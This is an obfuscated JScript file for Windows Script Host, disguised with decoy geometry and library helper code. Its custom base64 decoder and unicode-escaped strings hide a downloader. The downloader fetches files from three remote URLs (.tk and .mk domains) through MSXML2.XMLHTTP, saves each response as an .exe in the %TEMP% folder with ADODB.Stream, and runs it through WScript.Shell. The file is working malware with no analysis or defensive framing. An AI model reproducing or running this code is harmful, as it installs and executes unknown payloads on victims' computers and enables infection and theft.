
var propound = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  maligned = [];
var grace = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};var futility = 0;
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function boxes(report) {
	sectarian = report;
	for (var i in grace){sectarian = sectarian.replace(i, grace[i]);}
    return sectarian;
};

var burrows = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.boxes4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("cordon").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = propound[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = propound[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = propound[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = propound[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var apostate ="cordonJVcordonRFTVcordonAl".boxes4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var corks = "cordonQWcordonN0aXZcordonlWE9iacordonmVjdA=cordon=".boxes4();
String.prototype.boxes2 = function () {
    var ejaculation = {
        tropics: this
    };
    ejaculation.charger = ejaculation.tropics["c3Vic3RyaW5n".boxes4()](futility, burrows);
    return ejaculation.charger;
};

var assist ="cordonRXhwYW5cordonkRW52aXcordonJvbm1lbnRTdHJcordonpbmdz".boxes4();
var Native = function(options){
	
};
var cadillac = [corks, assist,apostate,  ""+"."+("slides","prostores","examines","waltz","acquirement","engine","radius","dissemble","exe"), "UnVu".boxes4(), boxes("M"+"SX"+"ML"+("retrieve","details","victorian","outlandish","cameroon","services","syllogism","2.")+"|M"+"LH"+"TT"+("juice","fortification","zurich","located","chester","client","confidentiality","safety","P>")+"WU"+("hottest","threesome","lindsay","akimbo","concept","artificer","chafe","cr")+("marshy","verbatim","keyhole","prayer","porno","omissions","maria","brigantine","ip")+"t:"+("racks","crochet","provencal","bodyguard","workflow","depressing","defines","slide","Sh")+"ell")];
administrator = "_F2_";
var smudge = this[cadillac.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
QofeoGBvHPn = "gxelbpz";
thereof = (("completed", "disprove", "rating", "archived", "outdone", "immunology", "fiftieth", "pRnkITeCQA") + "VJAvDgCw").boxes2();
reads = (("ideas", "describes", "crack", "modena", "futures", "pristine", "breeding", "bookseller", "hinge", "sDjDFfQGxOEV") + "DfBgCevkkdJ").boxes2();
  
    String.prototype.intrude = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var adaptation = cadillac.pop().split(">");

undivided = "b3Blbg==".boxes4();
var texture = new smudge(adaptation[1]);
var organisms = new smudge(adaptation[0]);
var joining = texture[cadillac.shift()](cadillac.shift());
weasel = (("ingratiate", "files", "neighborhood", "attraction", "EoSDLJSXIErU") + "nHeRmGMm").boxes2();

var derived = cadillac.shift();
var squalid = cadillac.shift();
function punctual(examination, enamoured) {

    try {
        var bystander = joining + "/" + enamoured ;
		bystander = bystander+ derived;
            organisms[undivided](("payment","adopt","G" + weasel) + ("helena","bride","insidious","subsection","T"), examination, false);
       
    BrDXpbbgm = "_F7_";
    organisms[reads + ("summit","sugar","end")]();
	var healthy=(WScript+"thereof"=="V2luZG93cyBTY3JpcHQgSG9zdA==".boxes4()+"thereof")&&organisms["c3RhdHVz".boxes4()] +""=="MjAw".boxes4()&&typeof(zyIqmnUMVF)==="undefined";
	lQHNgR = "_F8_";
    if (healthy) {
		
        var jason = new smudge((("holocaust","wages","scoop","techrepublic","cancer","polemical","volunteer","busts","A")+("adelaide","gavin","commentary","dispel","fabulous","fraternal","sanyo","punic","SEOO")+"DB"+("composed","beginning","world","likelihood","expenditures","patter","soccer",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        jason[undivided]();
        mmjfSTa = "_F9_";
        jason.type = burrows;
        WDqxqMAYN = "_F10_";
        jason["d3JpdGU=".boxes4()](organisms[("fatherhood","leprosy","overture","assure","promptly","patents","chips","")+"R"+"es"+"pon"+grace['U'].toLowerCase()+"e"+"Qm9keQ==".boxes4()]);
        RVBrDvWE = "_F11_";
        jason[(thereof + "o"+("boutique","inserting","guitar","spice","battery","languages","dirty","trumps","00")+("bicycle","sophisticated","foundation","albumen","objecting","stewed","fairfield","8i")+"tion").replace("0"+("ibrahim","karen","profundity","unknown","shuttle","ordination","incredible","08"), reads)] = 0;
        RDrSQFqo = "_F12_";
        jason[("misdemeanor","celebs","deceptive","islet","category","issue","murky","s")+"aveT"+"oF"+"ile"](bystander, 2);
        tRwgbC = "_F13_";
        jason.close();
        jjbrDKn = "_F14_";
		texture[squalid](bystander, burrows, true);
    }
} catch (rdJKTI) { };

    inCiYEJyQa = "_F15_";
}
try{
punctual("aHR0cDovLw==".boxes4()+"\u0066\u0061\u006B\u0065\u0072\u0061\u006D\u0061"+"\u002E\u0074\u006B\u002F\u0073\u0064\u0066\u0067\u0034\u0067\u0033" + "?vEUXKUYd=lVmMgpkA","VEtwFJiDSC");}catch(yKjqfpIlts){}

try{
punctual("aHR0cDovLw==".boxes4()+"\u0076\u0069\u0064\u0065\u006F\u0064\u006C"+"\u002E\u0074\u006B\u002F\u0036\u0035\u0067\u0034\u0033\u0034\u0066" + "?LQoBlbObJt=KUvdXXl","gcwsTAMUGQ");}catch(YgugRChex){}
punctual("aHR0cDovLw==".boxes4()+"\u0077\u0077\u0077"+"\u002E\u0073\u0065\u006F\u0075\u0067\u006F\u0073\u0074\u0069\u0076\u0061\u0072\u002E\u006D\u006B\u002F\u0034\u0033\u0034\u0035\u0034\u0079\u0074\u0033\u0032" + "?NQSppY=UbqJYEl","pxuayfhjdu");
   qNCAQT = "_F16_";
   